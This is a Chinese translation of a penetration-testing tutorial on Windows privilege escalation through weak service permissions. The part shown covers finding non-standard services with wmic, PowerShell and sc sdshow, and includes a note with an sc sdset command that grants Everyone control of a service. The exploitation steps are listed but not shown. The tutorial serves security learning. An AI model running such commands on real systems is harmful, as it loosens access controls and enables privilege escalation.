<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Windows 提权/Windows 提权-服务_弱服务权限" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 提权-服务_弱服务权限 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 提权-服务_弱服务权限 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Weak Service Permissions – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Weak Service Permissions – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.bd0a5f0e.css">
<script src="/web/assets/js/runtime~main.224207a9.js" defer="defer"></script>
<script src="/web/assets/js/main.e046f592.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/渗透">渗透</a><button aria-label="折叠侧边栏分类 &#x27;渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="展开侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="折叠侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL">Windows 提权-MSSQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare">Windows 提权-PrintNightmare</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs">Windows 提权-RunAs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权">Windows 提权-SeBackupPrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权">Windows 提权-SeImpersonatePrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过">Windows 提权-UAC 绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-不安全的 GUI 程序">Windows 提权-不安全的 GUI 程序</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_1">Windows 提权-内核利用_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_2">Windows 提权-内核利用_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-密码搜寻">Windows 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-手工枚举">Windows 提权-手工枚举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持">Windows 提权-服务_DLL 劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限">Windows 提权-服务_弱文件_目录权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限">Windows 提权-服务_弱服务权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限">Windows 提权-服务_弱注册表权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径">Windows 提权-服务_未引用的服务路径</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">Linux</a><button aria-label="展开侧边栏分类 &#x27;Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">Windows</a><button aria-label="展开侧边栏分类 &#x27;Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/windows-提权"><span itemprop="name">Windows 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Windows 提权-服务_弱服务权限</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 提权-服务_弱服务权限</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/" target="_blank" rel="noopener noreferrer">Weak Service Permissions – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 搜寻非标准服务</a>
<ul>
<li><a href="#id1.1">1.1 cmd</a></li>
<li><a href="#id1.2">1.2 powershell</a></li>
</ul>
</li>
<li><a href="#id2">2 搜寻服务的弱权限</a>
<ul>
<li><a href="#id2.1">2.1 枚举服务的弱权限：手动</a></li>
<li><a href="#id2.2">2.2 枚举服务的弱权限：工具</a>
<ul>
<li><a href="#id2.2.1">2.2.1 Accesschk</a></li>
<li><a href="#id2.2.2">2.2.2 SetACL</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id3">3 工具搜寻弱服务</a>
<ul>
<li><a href="#id3.1">3.1 Accesschk</a></li>
<li><a href="#id3.2">3.2 PowerUp/winPEAS</a></li>
</ul>
</li>
<li><a href="#id4">4 利用服务的弱权限</a>
<ul>
<li><a href="#id4.1">4.1 收集服务信息</a></li>
<li><a href="#id4.2">4.2 修改服务启动程序路径 - POC</a></li>
<li><a href="#id4.3">4.3 修改服务启动程序路径 - EXP</a></li>
</ul>
</li>
<li><a href="#id5">5 注意事项</a></li>
<li><a href="#id6">6 滥用 PowerUp.ps1 功能</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将介绍如何利用服务的弱权限。首先，我们将发现一个非标准的服务正在运行，而该服务对于系统中的标准用户又有着太多的访问权限。然后，又发现该服务存在错误配置，而错误配置又允许我们修改服务的启动程序路径使其指向恶意程序。最后，我们重启服务并获得 SYSTEM shell。</p>
<p>此外，我们还将看到如何使用工具来轻松找到这种服务的错误配置，甚至为我们提供漏洞利用。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1搜寻非标准服务"><strong><div id="id1">1、搜寻非标准服务</div></strong><a href="#1搜寻非标准服务" class="hash-link" aria-label="1搜寻非标准服务的直接链接" title="1搜寻非标准服务的直接链接">​</a></h2>
<p>在此示例中，假设我们作为标准用户 cmarko 已在目标机器上获得了立足点。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346533-375166366-a81c398987e143691cb02cce96df3584.png" width="504" height="186" class="img_ev3q"></p>
<p>为了查找弱服务，我们必须先查看系统上正在运行的服务有哪些。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11cmd"><strong><div id="id1.1">1.1、cmd</div></strong><a href="#11cmd" class="hash-link" aria-label="11cmd的直接链接" title="11cmd的直接链接">​</a></h4>
<p>首先，使用 wmic 命令查看系统上运行的所有服务：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wmic service get name,displayname,pathname,startmode</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184349025-376759609-0d14819dfe8ee1abcb1ef40bc60fb5e7.png" width="1024" height="696" class="img_ev3q"></p>
<p>从输出结果中可以看到，这里运行着大量的系统服务，而这些服务大多数都是从 <code>C:\Windows\System32</code> 执行的，而标准用户通常对 <code>C:\Windows\*</code> 中的任何内容都没有权限，因此我们需要过滤掉所有的系统服务。【而且，系统服务在默认情况下也不会出现错误配置的问题。】</p>
<p>而我们最感兴趣的是非标准服务，因此可以使用以下命令来缩小搜索范围，以排除系统服务：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346933-1651829571-418cd88f3a77d74cf0050b2fde02c9ce.png" width="1024" height="293" class="img_ev3q"></p>
<p>很快！这个自定义的“Juggernaut”服务便引起了我们的注意。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="12powershell"><strong><div id="id1.2">1.2、powershell</div></strong><a href="#12powershell" class="hash-link" aria-label="12powershell的直接链接" title="12powershell的直接链接">​</a></h4>
<p>要执行与 wmic 命令等效的 PowerShell 命令，我们可以使用 Get-WmiObject cmdlet，就像这样：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-WmiObject -class Win32_Service -Property Name,DisplayName,PathName,StartMode | Where {$_.PathName -notlike &quot;C:\Windows\*&quot;} | Select PathName,DisplayName,Name</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346840-127474888-c2bf70121ae947fc503b749169bd4065.png" width="998" height="285" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2搜寻服务的弱权限"><strong><div id="id2">2、搜寻服务的弱权限</div></strong><a href="#2搜寻服务的弱权限" class="hash-link" aria-label="2搜寻服务的弱权限的直接链接" title="2搜寻服务的弱权限的直接链接">​</a></h2>
<p>找到有趣的服务后，我们想深入了解服务本身的权限，看看是否有可利用的机会。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21枚举服务的弱权限手动"><strong><div id="id2.1">2.1、枚举服务的弱权限：手动</div></strong><a href="#21枚举服务的弱权限手动" class="hash-link" aria-label="21枚举服务的弱权限手动的直接链接" title="21枚举服务的弱权限手动的直接链接">​</a></h4>
<p>我们可以使用 sc 命令来枚举服务权限，但是它输出的结果让人很难理解。例如：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc sdshow Juggernaut</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346508-1268879961-9054563bc2360ea8a411f45f17f2c4f4.png" width="900" height="102" class="img_ev3q"></p>
<blockquote>
<p>注：也可以通过 <code>sc sdset Juggernaut D:(A;;CCDCLCSWRPWPDTLORC;;WD)</code> 去授予 Eyeryone 用户管理 Juggernaut 服务的权限。</p>
</blockquote>
<p>而上面的输出其实已经告诉了我们有关服务权限的所有信息，只是需要配合下面的图表来解读。</p>
